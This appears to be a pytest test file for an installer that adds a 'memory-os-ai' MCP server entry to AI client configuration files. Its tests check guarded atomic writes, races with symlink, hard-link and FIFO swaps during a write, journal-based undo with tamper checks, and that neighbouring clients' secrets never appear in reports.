def test_a_journal_changed_while_its_revocation_is_prepared_is_not_overwritten(home, tmp_path, monkeypatch):
    """Revocation rewrites follow the same discipline: another run of the tool touched the journal."""
    first = install_from(home, tmp_path, "cursor")
    journal = Path(first["journal"])
    real = qs.tempfile.mkstemp
    seen = []

    def mkstemp(*args, **kwargs):
        made = real(*args, **kwargs)
        if kwargs.get("prefix") == ".journal.json." and Path(kwargs["dir"]) == journal.parent and not seen:
            seen.append(1)
            journal.write_text(journal.read_text() + "\n")
            journal.chmod(0o600)
        return made
    monkeypatch.setattr(qs.tempfile, "mkstemp", mkstemp)
    entry = servers(home, "cursor")["memory-os-ai"]
    out = qs.undo(first["stamp"], home=home, journal_root=tmp_path / "journal")
    assert seen and out["results"] == [{"client": "cursor", "undo": "revocation-failed-entry-untouched"}]
    assert servers(home, "cursor")["memory-os-ai"] == entry
    assert not any(record.get("revoked") for record in json.loads(journal.read_text())["records"])


def test_undo_never_overwrites_an_entry_written_while_a_json_restoration_is_prepared(home, tmp_path, monkeypatch):
    """The RESTORATION path (previous entry put back), not only the removal: F written meanwhile stays."""
    set_entry(home, "cursor", EXISTING["legacy-v3"])
    _, result = apply(home, tmp_path, ("cursor",), replace_existing=("cursor",))
    assert status(result) == {"cursor": "applied"}
    seen = inject_during_preparation(monkeypatch, home, "cursor")
    out = qs.undo(result["stamp"], home=home, journal_root=tmp_path / "journal")
    assert seen and out["results"] == [{"client": "cursor", "undo": "refused-entry-changed-since-apply"}]
    assert servers(home, "cursor")["memory-os-ai"] == FOREIGN_NOW and no_temporary_left(home, "cursor")


class FailingAdd(FakeSystem):
    """``claude mcp add`` fails; optionally another writer puts its entry right after that failure."""

    def __init__(self, home, *, writer):
        super().__init__(home)
        self.writer, self.failed = writer, False

    def __call__(self, argv, **kwargs):
        argv = [str(a) for a in argv]
        if argv[:3] == ["claude", "mcp", "add"] and not self.failed:
            self.failed = True
            self.calls.append(argv)
            if self.writer:
                set_entry(self.home, "claude-code", FOREIGN_NOW)
            return self._done(1, stderr="refused")
        return super().__call__(argv, **kwargs)


@pytest.mark.parametrize("writer", [False, True])
def test_claude_code_best_effort_return_after_a_failed_add_is_revalidated(home, tmp_path, writer):
    """Replace E1 by E2: ``remove`` works, ``add`` fails. E1 is put back through the CLI only if our
    name is still absent; an entry written by someone else right after the failure is kept."""
    install_from(home, tmp_path, "claude-code")
    first = servers(home, "claude-code")["memory-os-ai"]
    plan = qs.preview(home=home, python=PY, env=ENV, clients=("claude-code",), journal_root=tmp_path / "journal")
    system = FailingAdd(home, writer=writer)
    with pytest.raises(qs.QuickstartError, match="private journal retained"):
        qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal", run=system)
    verbs = [argv[2] for argv in system.calls]
    if writer:
        assert verbs == ["remove", "add"] and servers(home, "claude-code")["memory-os-ai"] == FOREIGN_NOW
    else:
        assert verbs == ["remove", "add", "add"] and servers(home, "claude-code")["memory-os-ai"] == first


# ---- the write primitive: an explicit, required expectation and no state between calls ----

def sha(text):
    import hashlib
    return hashlib.sha256(text.encode()).hexdigest()


def target(tmp_path, text="zero"):
    path = tmp_path / "config" / "file.json"
    path.parent.mkdir()
    path.write_text(text)
    return path


def leftovers(path):
    return [item.name for item in path.parent.iterdir() if item.name != path.name]


def test_a_write_without_an_expectation_is_impossible(tmp_path):
    path = target(tmp_path)
    with pytest.raises(TypeError):
        qs._atomic_write(path, "new")
    with pytest.raises(TypeError):
        qs._atomic_write(path, "new", sha("zero"))  # keyword only: never a positional accident
    for bad in (None, "", "abc", 0, object()):
        with pytest.raises(qs.QuickstartError):
            qs._atomic_write(path, "new", expected=bad)
    assert path.read_text() == "zero" and leftovers(path) == []


def test_expected_digest_and_absent_are_each_enforced(tmp_path):
    path = target(tmp_path)
    qs._atomic_write(path, "one", expected=sha("zero"))
    assert path.read_text() == "one"
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(path, "two", expected=sha("zero"))  # stale expectation
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(path, "two", expected=qs.ABSENT)    # ABSENT requires absence
    assert path.read_text() == "one" and leftovers(path) == []
    fresh = path.with_name("new.json")
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(fresh, "x", expected=sha("zero"))   # a digest requires the file
    qs._atomic_write(fresh, "x", expected=qs.ABSENT)
    assert fresh.read_text() == "x" and leftovers(path) == ["new.json"]


def test_unguarded_is_only_for_a_journal_file_in_a_fresh_private_directory_of_this_run(tmp_path):
    path = target(tmp_path)
    with pytest.raises(qs.QuickstartError, match="Unguarded"):
        qs._atomic_write(path, "new", expected=qs.UNGUARDED)
    private = tmp_path / ("20260101-000000-" + "a" * 32)
    private.mkdir(mode=0o700)  # private, well named, but NOT created by new_journal in this run
    with pytest.raises(qs.QuickstartError, match="Unguarded"):
        qs._atomic_write(private / "journal.json", "{}", expected=qs.UNGUARDED)
    journal = qs.new_journal(tmp_path / "journals")
    with pytest.raises(qs.QuickstartError, match="Unguarded"):
        qs._atomic_write(journal / "anything.json", "{}", expected=qs.UNGUARDED)  # not a journal file
    qs._atomic_write(journal / "journal.json", "{}", expected=qs.UNGUARDED)
    qs._atomic_write(journal / "journal.json", "{ }", expected=qs.UNGUARDED)
    journal.chmod(0o755)
    with pytest.raises(qs.QuickstartError, match="Unguarded"):
        qs._atomic_write(journal / "journal.json", "{}", expected=qs.UNGUARDED)  # no longer private
    assert path.read_text() == "zero" and (journal / "journal.json").read_text() == "{ }"


def test_a_nested_write_on_the_same_path_does_not_disturb_the_expectation_of_the_outer_one(tmp_path, monkeypatch):
    """The inner write (correct expectation) lands while the outer one is prepared: the outer one,
    still holding ITS expectation, sees the change and writes nothing."""
    path = target(tmp_path)
    real = qs.tempfile.mkstemp
    depth = []

    def mkstemp(*args, **kwargs):
        made = real(*args, **kwargs)
        if not depth:
            depth.append(1)
            qs._atomic_write(path, "inner", expected=sha("zero"))
        return made
    monkeypatch.setattr(qs.tempfile, "mkstemp", mkstemp)
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(path, "outer", expected=sha("zero"))
    assert path.read_text() == "inner" and leftovers(path) == []
    qs._atomic_write(path, "after", expected=sha("inner"))  # nothing stale is left behind
    assert path.read_text() == "after"


def test_two_threads_on_the_same_path_each_keep_their_own_expectation(tmp_path, monkeypatch):
    """T2 is called first with the digest it read and is held after its temporary file is prepared;
    T1 then writes completely; T2 resumes: its own expectation is still the one it was given."""
    import threading
    path = target(tmp_path)
    prepared, release = threading.Event(), threading.Event()
    real = qs.os.chmod
    outcome = {}

    def chmod(name, mode, *args, **kwargs):
        real(name, mode, *args, **kwargs)
        if threading.current_thread().name == "second":
            prepared.set()
            assert release.wait(10)

    def write(label, text):
        try:
            qs._atomic_write(path, text, expected=sha("zero"))
            outcome[label] = "written"
        except qs.EntryChanged:
            outcome[label] = "conflict"
    monkeypatch.setattr(qs.os, "chmod", chmod)
    second = threading.Thread(target=write, args=("second", "from-second"), name="second")
    second.start()
    assert prepared.wait(10)
    first = threading.Thread(target=write, args=("first", "from-first"), name="first")
    first.start()
    first.join(10)
    release.set()
    second.join(10)
    assert outcome == {"first": "written", "second": "conflict"}
    assert path.read_text() == "from-first" and leftovers(path) == []


def test_writes_on_distinct_paths_do_not_share_anything(tmp_path):
    one = target(tmp_path)
    two = one.with_name("other.json")
    two.write_text("zero")
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(one, "x", expected=sha("something else"))
    qs._atomic_write(two, "y", expected=sha("zero"))
    assert (one.read_text(), two.read_text()) == ("zero", "y")


def test_an_exception_during_a_write_leaves_no_state_and_no_temporary_file(tmp_path, monkeypatch):
    path = target(tmp_path)
    real = qs.os.replace

    def broken(*args, **kwargs):
        raise OSError("disk full")
    monkeypatch.setattr(qs.os, "replace", broken)
    with pytest.raises(OSError):
        qs._atomic_write(path, "new", expected=sha("zero"))
    monkeypatch.setattr(qs.os, "replace", real)
    assert path.read_text() == "zero" and leftovers(path) == []
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(path, "new", expected=sha("not zero"))  # still checked after the failure
    qs._atomic_write(path, "new", expected=sha("zero"))
    assert path.read_text() == "new"


def test_aliases_of_a_file_are_the_same_checked_path_or_a_refusal(tmp_path, monkeypatch):
    path = target(tmp_path)
    link = path.with_name("link.json")
    link.symlink_to(path)
    with pytest.raises(qs.QuickstartError, match="Unsafe"):
        qs._atomic_write(link, "x", expected=sha("zero"))  # symbolic link: refused
    link.unlink()
    os.link(path, link)
    for alias in (path, link):
        with pytest.raises(qs.QuickstartError, match="hard links"):
            qs._atomic_write(alias, "x", expected=sha("zero"))  # two names for one file: refused
    link.unlink()
    monkeypatch.chdir(path.parent)
    relative = Path(path.name)
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(relative, "x", expected=sha("stale"))  # a relative name is the same checked file
    qs._atomic_write(relative, "x", expected=sha("zero"))
    assert path.read_text() == "x" and leftovers(path) == []


# ---- Codex implementation review n° 5: the last look never follows a link ----

def during_preparation(monkeypatch, path, action):
    """Run ``action`` on the target while OUR temporary file for it is being prepared."""
    real = qs.tempfile.mkstemp
    seen = []

    def mkstemp(*args, **kwargs):
        made = real(*args, **kwargs)
        if kwargs.get("prefix") == f".{path.name}." and not seen:
            seen.append(1)
            action()
        return made
    monkeypatch.setattr(qs.tempfile, "mkstemp", mkstemp)
    return seen


def test_a_dangling_symbolic_link_created_during_the_preparation_is_not_absence(tmp_path, monkeypatch):
    directory = tmp_path / "config"
    directory.mkdir()
    path = directory / "file.json"
    seen = during_preparation(monkeypatch, path, lambda: path.symlink_to(tmp_path / "nowhere"))
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(path, "ours", expected=qs.ABSENT)
    assert seen and path.is_symlink() and os.readlink(path) == str(tmp_path / "nowhere")
    assert not (tmp_path / "nowhere").exists() and [item.name for item in directory.iterdir()] == ["file.json"]


def test_a_symbolic_link_to_identical_content_created_during_the_preparation_is_not_the_target(tmp_path, monkeypatch):
    path = target(tmp_path)
    twin = tmp_path / "twin.json"
    twin.write_text("zero")  # exactly the expected bytes, behind a link

    def swap():
        path.unlink()
        path.symlink_to(twin)
    seen = during_preparation(monkeypatch, path, swap)
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(path, "ours", expected=sha("zero"))
    assert seen and path.is_symlink() and twin.read_text() == "zero" and leftovers(path) == []


def test_a_hard_link_created_during_the_preparation_is_a_conflict(tmp_path, monkeypatch):
    path = target(tmp_path)
    other = tmp_path / "second-name.json"
    seen = during_preparation(monkeypatch, path, lambda: os.link(path, other))
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(path, "ours", expected=sha("zero"))
    assert seen and path.read_text() == "zero" and other.read_text() == "zero"
    assert path.stat().st_ino == other.stat().st_ino and leftovers(path) == []


@pytest.mark.parametrize("kind", ["directory", "fifo"])
@pytest.mark.parametrize("expectation", ["absent", "digest"])
def test_a_directory_or_a_fifo_appearing_during_the_preparation_is_a_conflict(tmp_path, monkeypatch, kind, expectation):
    directory = tmp_path / "config"
    directory.mkdir()
    path = directory / "file.json"
    if expectation == "digest":
        path.write_text("zero")

    def put():
        if path.exists():
            path.unlink()
        path.mkdir() if kind == "directory" else os.mkfifo(path)
    seen = during_preparation(monkeypatch, path, put)
    with pytest.raises(qs.EntryChanged):
        qs._atomic_write(path, "ours", expected=qs.ABSENT if expectation == "absent" else sha("zero"))
    import stat as modes
    mode = os.lstat(path).st_mode
    assert seen and (modes.S_ISDIR(mode) if kind == "directory" else modes.S_ISFIFO(mode))
    assert [item.name for item in directory.iterdir()] == ["file.json"]


@pytest.mark.parametrize("key", ["cursor", "codex"])
def test_a_client_file_swapped_for_a_link_during_the_preparation_is_never_written_through(home, tmp_path, monkeypatch, key):
    """Through the real mutation path: same content behind a symbolic link, created during the preparation."""
    plan = qs.preview(home=home, python=PY, env=ENV, clients=(key,))
    path = home / PATHS[key]
    twin = tmp_path / "twin"
    original = path.read_bytes()

    def swap():
        twin.write_bytes(original)
        path.unlink()
        path.symlink_to(twin)
    seen = during_preparation(monkeypatch, path, swap)
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal")
    assert seen and status(result) == {key: "conflict-file-changed-since-preview"}
    assert path.is_symlink() and twin.read_bytes() == original and no_temporary_left(home, key)


def test_a_client_file_that_did_not_exist_is_not_created_over_a_dangling_link(home, tmp_path, monkeypatch):
    path = home / PATHS["cursor"]
    path.unlink()
    plan = qs.preview(home=home, python=PY, env=ENV, clients=("cursor",))
    assert plan["clients"][0]["action"] == "create" and plan["clients"][0]["file_sha256"] is None
    seen = during_preparation(monkeypatch, path, lambda: path.symlink_to(tmp_path / "nowhere"))
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal")
    assert seen and status(result) == {"cursor": "conflict-file-changed-since-preview"}
    assert path.is_symlink() and not (tmp_path / "nowhere").exists() and no_temporary_left(home, "cursor")


def test_after_a_replace_and_its_undo_a_new_replace_needs_named_consent(home, tmp_path):
    """E1 -> E2 (proven replace) -> undo puts E1 back from the backup, but its proof was consumed."""
    install_from(home, tmp_path, "cursor")  # E1
    first = servers(home, "cursor")["memory-os-ai"]
    plan = qs.preview(home=home, python=PY, env=ENV, clients=("cursor",), journal_root=tmp_path / "journal")
    replaced = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal",
                                run=FakeSystem(home))  # E2
    assert status(replaced) == {"cursor": "applied"}
    out = qs.undo(replaced["stamp"], home=home, journal_root=tmp_path / "journal")
    assert out["results"] == [{"client": "cursor", "undo": "restored"}]
    assert servers(home, "cursor")["memory-os-ai"] == first  # E1 is back
    item = preview_one(home, tmp_path, "cursor")
    assert (item["action"], item["ownership"]) == ("refuse-existing-relay-unproven", "unproven")
    assert preview_one(home, tmp_path, "cursor", replace_existing=("cursor",))["action"] == "replace"


def test_a_4_0_9_journal_is_accepted_as_proof_when_it_holds_the_exact_entry(home, tmp_path):
    """Journals written before this contract have ``applied_entry`` but no digest: still a binding."""
    client = next(c for c in CLIENTS if c.key == "cursor")
    entry = qs.desired_entry(client, OLD_PY, ENV)
    set_entry(home, "cursor", entry)
    stamp = "20261001-120000-" + "a" * 32
    directory = tmp_path / "journal" / stamp
    directory.mkdir(parents=True, mode=0o700)
    (tmp_path / "journal").chmod(0o700)
    journal = directory / "journal.json"
    journal.write_text(json.dumps({"version": 1, "stamp": stamp, "records": [{
        "client": "cursor", "path": str(home / PATHS["cursor"]), "action": "create", "status": "applied",
        "previous_entry": None, "applied_entry": entry, "method": "json-merge"}]}))
    journal.chmod(0o600)
    assert preview_one(home, tmp_path, "cursor")["ownership"] == "journal"
    record = json.loads(journal.read_text())["records"][0]
    record["client"] = "vscode"
    journal.write_text(json.dumps({"version": 1, "stamp": stamp, "records": [record]}))
    assert preview_one(home, tmp_path, "cursor")["ownership"] == "unproven"


def test_journal_binds_client_entry_and_installation(home, tmp_path):
    _, result = apply(home, tmp_path, ("cursor",))
    record, = json.loads(Path(result["journal"]).read_text())["records"]
    assert record["client"] == "cursor" and record["status"] == "applied"
    assert record["installation_identity"] == qs.installation_identity(ENV)
    import hashlib
    entry = servers(home, "cursor")["memory-os-ai"]
    assert record["applied_entry_sha256"] == hashlib.sha256(json.dumps(entry, sort_keys=True).encode()).hexdigest()


def test_codex_relay_entry_strictly_identical_to_ours_is_unchanged(home, tmp_path):
    """Green today: the only existing TOML entry that is not a refusal is the exact one we would write."""
    apply(home, tmp_path, ("codex",))
    before = tree(home)
    plan, result = apply(home, tmp_path, ("codex",))
    assert plan["clients"][0]["action"] == "unchanged" and tree(home) == before


def test_codex_relay_entry_of_this_installation_but_different_is_still_manual(home, tmp_path):
    """Green today: no TOML rewrite, even for our own stale entry; the snippet is applied by hand."""
    write(home, PATHS["codex"], CODEX_TOML + '\n[mcp_servers.memory-os-ai]\ncommand = "/old/venv/bin/python"\n'
          'args = ["-m", "memory_os_v4.ops.relay"]\n[mcp_servers.memory-os-ai.env]\n'
          f'MEMORY_V4_URL = "{ENV["MEMORY_V4_URL"]}"\nMEMORY_V4_TOKEN_FILE = "{ENV["MEMORY_V4_TOKEN_FILE"]}"\n')
    before = tree(home)
    plan, result = apply(home, tmp_path, ("codex",))
    assert plan["clients"][0]["action"] == "refuse-toml-existing-manual" and tree(home) == before


def test_journal_never_holds_the_previous_entry_in_clear(home, tmp_path):
    set_entry(home, "cursor", EXISTING["direct-http"])
    _, result = apply(home, tmp_path, ("cursor",), replace_existing=("cursor",))
    journal = Path(result["journal"]).read_text()
    assert BEARER_SECRET not in journal and BEARER_SECRET not in json.dumps(result)
    record = json.loads(journal)["records"][0]
    assert "previous_entry" not in record and len(record["previous_entry_sha256"]) == 64
    assert record["previous_class"] == "direct-http"


def test_undo_after_a_consented_replace_restores_the_exact_previous_entry_from_the_backup(home, tmp_path):
    set_entry(home, "cursor", EXISTING["direct-http"])
    _, result = apply(home, tmp_path, ("cursor",), replace_existing=("cursor",))
    out = qs.undo(result["stamp"], home=home, journal_root=tmp_path / "journal")
    assert out["results"] == [{"client": "cursor", "undo": "restored"}]
    assert servers(home, "cursor")["memory-os-ai"] == EXISTING["direct-http"]
    assert BEARER_SECRET not in json.dumps(out)


def test_undo_refuses_when_the_backup_no_longer_matches_the_journal(home, tmp_path):
    set_entry(home, "cursor", EXISTING["direct-http"])
    _, result = apply(home, tmp_path, ("cursor",), replace_existing=("cursor",))
    backup = Path(result["records"][0]["backup"])
    backup.write_text(json.dumps({"mcpServers": {"memory-os-ai": {"command": "evil"}}}))
    os.chmod(backup, 0o600)
    out = qs.undo(result["stamp"], home=home, journal_root=tmp_path / "journal")
    assert out["results"] == [{"client": "cursor", "undo": "refused-backup-changed"}]
    assert classify(servers(home, "cursor")["memory-os-ai"]) == "relay"


# ---- a client that rewrites its own file ----

@pytest.mark.parametrize("key", FILE_CLIENTS)
def test_file_rewritten_between_preview_and_apply_is_a_conflict(home, tmp_path, key):
    """Green today: the app (Claude Desktop, an editor) won the race; nothing is written."""
    plan = qs.preview(home=home, python=PY, env=ENV, clients=(key,))
    path = home / PATHS[key]
    path.write_text(path.read_text(encoding="utf-8") + "\n", encoding="utf-8")
    rewritten = path.read_bytes()
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal")
    assert status(result) == {key: "conflict-file-changed-since-preview"}
    assert path.read_bytes() == rewritten and "backup" not in result["records"][0]


# ---- nothing foreign is ever shown ----

@pytest.mark.parametrize("key", SIX)
def test_preview_and_apply_reports_never_expose_foreign_configuration(home, tmp_path, key):
    """Green today: reports hold our entry only; the neighbours' secrets stay in their file."""
    plan, result = apply(home, tmp_path, (key,))
    shown = json.dumps(plan) + json.dumps(result) + json.dumps(qs.report(plan))
    assert not any(secret in shown for secret in SECRETS)
    assert not any(secret in Path(result["journal"]).read_text() for secret in SECRETS)
